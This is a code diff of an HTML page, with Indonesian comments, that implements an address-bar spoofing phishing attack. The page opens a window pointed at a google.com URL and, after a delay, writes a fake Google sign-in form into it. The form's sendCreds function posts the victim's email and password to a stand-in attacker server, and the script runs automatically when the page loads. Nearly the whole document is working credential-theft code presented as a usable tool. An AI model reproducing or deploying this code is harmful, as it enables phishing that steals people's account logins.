@@ -1,39 +1,44 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <button onclick="spoof()">Click to spoof</button>
+    <button onclick="spoof()">Click to spoofff</button>
 
     <script>
       function spoof() {
-        // 1. Buka tab baru ke domain target (untuk spoof address bar)
+        // 1. Buka tab baru ke domain target (akan kelihatan seperti google.com:1234)
         let win = window.open("https://www.google.com:1234", "_blank");
 
-        // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
+        // 2. Tunggu 3 detik lalu ganti isi halaman dengan form palsu
         setTimeout(() => {
-  win.document.body.innerHTML = `
-    <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;
-                background:white;z-index:9999;display:flex;flex-direction:column;justify-content:center;align-items:center;">
-      <h3>Google Login Required</h3>
-      <p>Please login to your Google Account to continue to Facebook.com</p>
-      <input placeholder="Email" /><br/>
-      <input placeholder="Password" type="password" /><br/>
-      <button onclick="sendCreds()">Login</button>
-    </div>
-    <script>
-      function sendCreds() {
-        // Kirim ke server attacker
-        let email = document.querySelector('input[placeholder=Email]').value;
-        let pass = document.querySelector('input[placeholder=Password]').value;
-        fetch('https://attacker.site/log', {
-          method: 'POST',
-          body: JSON.stringify({email, pass}),
-          headers: {'Content-Type': 'application/json'}
-        });
-      }
-  `;
-}, 3000);
+          const fakeLogin = `
+            <div style="font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;">
+              <h3 style="margin-bottom:10px;">Sign in with your Google Account</h3>
+              <p style="text-align:center;margin-bottom:20px;">To access Facebook.com, please log in with your Google account.</p>
+              <input id="email" type="email" placeholder="Email" style="margin:5px;padding:10px;width:250px;" />
+              <input id="pass" type="password" placeholder="Password" style="margin:5px;padding:10px;width:250px;" />
+              <button onclick="sendCreds()" style="margin-top:15px;padding:10px 20px;">Sign In</button>
+            </div>
+            <script>
+              function sendCreds() {
+                let email = document.getElementById('email').value;
+                let pass = document.getElementById('pass').value;
+                fetch('https://attacker-site.example.com/log', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify({ email, pass })
+                });
+                alert("Logging in...");
+              }
+            </script>
+          `;
 
-      spoof(); // Auto-run saat halaman dibuka
+          // Ganti isi window yang baru dibuka dengan HTML palsu
+          win.document.write(fakeLogin);
+        }, 3000);
+      }
+
+      // Auto-run saat halaman dibuka (jika ingin otomatis, tidak perlu klik tombol)
+      spoof();
     </script>
   </body>
 </html>
